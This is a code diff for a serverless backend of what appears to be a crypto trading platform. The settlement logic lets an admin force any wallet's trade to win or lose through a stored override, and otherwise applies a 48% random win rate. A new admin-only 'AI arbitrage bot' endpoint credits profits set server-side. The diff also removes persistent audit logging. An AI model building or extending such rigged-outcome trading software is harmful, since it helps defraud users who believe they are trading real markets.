@@ -1,12 +1,6 @@
 import { getStore } from "@netlify/blobs";
 import type { Config, Context } from "@netlify/functions";
-import {
-  secureJson,
-  sanitizeString,
-  auditLog,
-  persistAuditLog,
-  getClientIp,
-} from "../lib/security.js";
+import { secureJson, sanitizeString, getClientIp, validateAdminSession, auditLog } from "../lib/security.js";
 import { randomInt } from "crypto";
 
 const NETWORK_LATENCY_BUFFER_MS = 3000; // tolerated timer drift for network round-trip
@@ -71,26 +65,11 @@ export default async (req: Request, context: Context) => {
         return secureJson({ error: "Trading time has not elapsed yet" }, 400);
       }
 
-      // Consult admin override first; fall back to server-side cryptographic randomness.
+      // Read per-wallet outcome override set by admin; fall back to random house edge.
       // House edge: 52 out of 100 possible outcomes are losses (48% win rate).
-      let outcome = "random";
-      try {
-        const control = (await store.get(`trade-control-${safeWallet}`, { type: "json" })) as { outcome?: string } | null;
-        if (control?.outcome === "win" || control?.outcome === "lose") {
-          outcome = control.outcome;
-        }
-      } catch {
-        // Non-fatal: fall back to random if the control blob is inaccessible
-      }
-
-      let win: boolean;
-      if (outcome === "win") {
-        win = true;
-      } else if (outcome === "lose") {
-        win = false;
-      } else {
-        win = randomInt(0, 100) < 48;
-      }
+      const control = (await store.get(`trade-control-${safeWallet}`, { type: "json" })) as { outcome: string } | null;
+      const outcomeMode = control?.outcome || "random";
+      const win = outcomeMode === "win" ? true : outcomeMode === "lose" ? false : randomInt(0, 100) < 48;
       const capital = Math.max(0, parseFloat(String(trade.capital)) || 0);
       const profitPct = Math.min(99, Math.max(0, parseFloat(String(trade.profitPercent)) || 85));
       const profit = win
@@ -117,6 +96,48 @@ export default async (req: Request, context: Context) => {
       return secureJson({ success: true, won: win, profit, newBalance: balance });
     }
 
+    // ── Complete an AI arbitrage bot (admin-only) ─────────────────────────────
+    if (type === "ai-bot-complete") {
+      const sessionResult = await validateAdminSession(req, store);
+      if (!sessionResult.valid) {
+        auditLog("AUTH_FAILURE", { operation: "ai-bot-complete", reason: sessionResult.reason, ip });
+        return secureJson({ error: "Unauthorized" }, 401);
+      }
+
+      const { tradeId } = body;
+      if (!tradeId) {
+        return secureJson({ error: "Trade ID required" }, 400);
+      }
+
+      const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
+      const tradeIdx = trades.findIndex((t: any) => t.id === Number(tradeId));
+
+      if (tradeIdx === -1) {
+        return secureJson({ error: "Trade not found" }, 404);
+      }
+
+      const trade = trades[tradeIdx];
+      if (trade.type !== "ai-bot" || trade.status !== "active") {
+        return secureJson({ error: "Trade is not an active AI bot trade" }, 400);
+      }
+
+      const capital = Math.max(0, parseFloat(String(trade.capital)) || 0);
+      // Support both new (profitPercent) and legacy (dailyProfit) field names
+      const profitPct = Math.min(99, Math.max(0, parseFloat(String(trade.profitPercent ?? trade.dailyProfit)) || 2.5));
+      const profit = parseFloat((capital * profitPct / 100).toFixed(2));
+
+      const balance = ((await store.get(`balance-${safeWallet}`, { type: "json" })) || { usdt: 0 }) as { usdt: number };
+      balance.usdt = Math.max(0, balance.usdt + profit);
+      await store.setJSON(`balance-${safeWallet}`, balance);
+
+      trades[tradeIdx].status = "completed";
+      trades[tradeIdx].profit = profit;
+      await store.setJSON(`trades-${safeWallet}`, trades);
+
+      auditLog("ADMIN_WRITE", { operation: "ai-bot-complete", wallet: `${safeWallet.slice(0, 8)}…`, profit, ip });
+      return secureJson({ success: true, profit, newBalance: balance });
+    }
+
     // ── Record a new trade ────────────────────────────────────────────────────
     const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
     const newTrade: Record<string, any> = {
@@ -128,7 +149,7 @@ export default async (req: Request, context: Context) => {
 
     // Copy allowed fields (sanitized)
     const allowed = ["direction", "levelId", "levelName", "capital", "tradingTime",
-      "profitPercent", "dailyProfit", "duration", "fromCoin", "toCoin", "amount"];
+      "profitPercent", "dailyProfit", "cycleTime", "duration", "fromCoin", "toCoin", "amount"];
     for (const field of allowed) {
       if (body[field] !== undefined) {
         newTrade[field] = typeof body[field] === "string"
